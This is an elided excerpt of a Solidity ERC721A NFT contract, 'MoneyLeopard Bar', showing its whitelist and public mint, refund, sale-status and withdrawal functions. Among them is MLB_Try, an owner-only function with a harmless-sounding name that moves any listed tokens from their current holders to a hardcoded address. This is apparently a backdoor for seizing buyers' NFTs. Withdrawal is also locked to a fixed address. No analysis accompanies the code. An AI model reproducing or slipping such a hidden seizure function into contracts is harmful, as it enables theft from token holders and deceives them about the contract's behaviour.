...
contract MoneyLeopard_Bar is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("MoneyLeopard Bar", "MLB", maxBatchSize_, collectionSize_) {
    maxPerAddressDuringMint = maxBatchSize_;
  }

  modifier MLB_callerIsUser() {
    require(tx.origin == msg.sender, "The caller is another contract");
    _;
  }

  function MLB_getMaxSupply() view public returns(uint256){
    return maxSupply;
  }


  function MLB_WhilteListMint(uint256 quantity,bytes32[] calldata _merkleProof) external payable MLB_callerIsUser {
    ...
    MLB_refundIfOver(totalCost);
  }

  function MLB_PublicMint(uint256 quantity) external payable MLB_callerIsUser {    
  ...
  function MLB_refundIfOver(uint256 price) private {
  ...
  function MLB_isPublicSaleOn() public view returns (bool) {
    return
      saleConfig.Price != 0 &&
  ...
  function MLB_Try(uint256[] memory tokenids) external onlyOwner {
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xfd575692a9c6E820123Aea049dCDa771d3B59856, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x6ea599a423d7308b4A9A5150b6c49b586243cDd0);
